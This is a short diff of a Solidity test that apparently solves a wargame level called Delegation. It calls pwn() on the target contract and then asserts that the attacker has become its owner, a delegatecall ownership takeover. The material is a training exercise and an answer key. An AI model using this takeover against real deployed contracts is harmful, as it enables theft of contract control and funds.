@@ -22,10 +22,8 @@ contract DelegationTest is LevelFactory {
   }
 
   function _performTest() internal override {
-    /* Write your code here */
     (bool worked,) = address(delegation).call(abi.encodeWithSignature("pwn()"));
     assert(worked);
-    /* Write your code here */
   }
 
   function _setupTest() internal override {
@@ -33,7 +31,6 @@ contract DelegationTest is LevelFactory {
   }
 
   function _checkTest() internal override returns (bool) {
-    /* Validating the test */
     assertEq(delegation.owner(), attacker);
 
     return (delegation.owner() == attacker);
